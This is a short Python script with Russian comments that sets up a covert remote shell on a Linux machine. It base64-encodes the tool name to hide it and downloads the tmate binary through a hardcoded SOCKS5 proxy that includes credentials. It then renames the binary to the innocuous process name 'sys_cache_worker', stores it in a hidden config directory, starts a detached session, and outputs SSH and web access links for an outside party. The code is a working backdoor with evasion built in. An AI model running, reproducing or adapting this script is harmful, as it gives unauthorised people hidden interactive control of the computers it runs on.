def main():
    import base64
    import os
    import tarfile
    import shutil
    import platform
    import subprocess
    import sys
    import urllib.request

    # Маскировка ключевого слова
    def d(s): return base64.b64decode(s).decode()
    _t = d("dG1hdGU=") # tmate
    
    # --- НАСТРОЙКИ ПУТЕЙ ---
    persist_dir = os.path.expanduser("~/.local/share/core_config")
    bin_name = "sys_cache_worker" # Это будет именем процесса в системе
    bin_path = os.path.join(persist_dir, bin_name)
    sock_path = os.path.join(persist_dir, "worker.sock")
    archive_path = os.path.join(persist_dir, "v_data.bin")
    proxy_address = "socks5://i76qPr:Lt1t3TZZhR@45.87.252.72:5501"

    # --- ОПРЕДЕЛЕНИЕ АРХИТЕКТУРЫ (ВАШ МАППИНГ) ---
    arch = platform.machine().lower()
    if arch in ("x86_64", "amd64"):
        asset_name = f"{_t}-2.4.0-static-linux-amd64"
    elif arch in ("aarch64", "arm64"):
        asset_name = f"{_t}-2.4.0-static-linux-arm64v8"
    elif arch in ("armv7l",):
        asset_name = f"{_t}-2.4.0-static-linux-arm32v7"
    elif arch in ("armv6l",):
        asset_name = f"{_t}-2.4.0-static-linux-arm32v6"
    elif arch in ("i386", "i686"):
        asset_name = f"{_t}-2.4.0-static-linux-i386"
    else:
        return f"❌ Architecture not supported: {arch}"

    url = f"https://github.com/{_t}-io/{_t}/releases/download/2.4.0/{asset_name}.tar.xz"

    def is_valid_xz(path):
        if not os.path.exists(path) or os.path.getsize(path) < 1000: return False
        with open(path, 'rb') as f: return f.read(6) == b'\xfd7zXZ\x00'

    def download_file(target_url, dest, proxy):
        # Попытка через curl
        try:
            cmd = ['curl', '-L', '-k', '-s', '-f', '--connect-timeout', '20', '-o', dest, target_url]
            if proxy: cmd.extend(['--proxy', proxy])
            if subprocess.run(cmd, capture_output=True).returncode == 0 and is_valid_xz(dest):
                return True
        except: pass
        # Попытка через urllib (без прокси)
        if not proxy:
            try:
                with urllib.request.urlopen(target_url, timeout=30) as r, open(dest, 'wb') as f:
                    shutil.copyfileobj(r, f)
                return is_valid_xz(dest)
            except: pass
        return False

    try:
        if not os.path.exists(persist_dir): os.makedirs(persist_dir, exist_ok=True)
        
        # Очистка старых процессов (по новому имени)
        subprocess.run(["pkill", "-9", bin_name], stderr=subprocess.DEVNULL)
        if os.path.exists(sock_path):
            try: os.remove(sock_path)
            except: pass

        if not os.path.exists(bin_path):
            print(f"Status: Fetching core components ({arch})...")
            # Сначала пробуем с прокси, потом напрямую
            if not download_file(url, archive_path, proxy_address):
                if not download_file(url, archive_path, None):
                    return f"❌ Download failed. Link: {url}"

            # Распаковка
            with tarfile.open(archive_path, "r:xz") as tar:
                tar.extractall(path=persist_dir)
            
            # Поиск бинарника и переименование
            extracted_bin = os.path.join(persist_dir, asset_name, _t)
            if os.path.exists(extracted_bin):
                shutil.move(extracted_bin, bin_path)
                os.chmod(bin_path, 0o755)
                # Чистка мусора
                shutil.rmtree(os.path.join(persist_dir, asset_name))
                os.remove(archive_path)
            else:
                return "❌ Error: Extraction failed (Target not found)."

        # Запуск службы
        if os.path.exists(bin_path):
            # Запуск скрытого процесса
            subprocess.run([bin_path, "-S", sock_path, "new-session", "-d"], stderr=subprocess.DEVNULL)
            
            # Ожидание флага готовности (tmate-ready)
            ready_flag = f"{_t}-ready"
            try:
                subprocess.run([bin_path, "-S", sock_path, "wait", ready_flag], timeout=40)
            except: pass

            # Извлечение данных доступа
            def get_val(key):
                fmt = "#{" + f"{_t}_{key}" + "}"
                try:
                    return subprocess.check_output([bin_path, "-S", sock_path, "display", "-p", fmt]).decode().strip()
                except: return "none"

            ssh_link = get_val("ssh")
            web_link = get_val("web")

            if "ssh" in ssh_link:
                return f"✅ SERVICE ONLINE\n\nSSH_ACCESS: {ssh_link}\nWEB_ACCESS: {web_link}"
            else:
                return "❌ Session started but connection links are empty."

    except Exception as e:
        return f"❌ Critical error: {str(e)}"

result = main()
print(result)
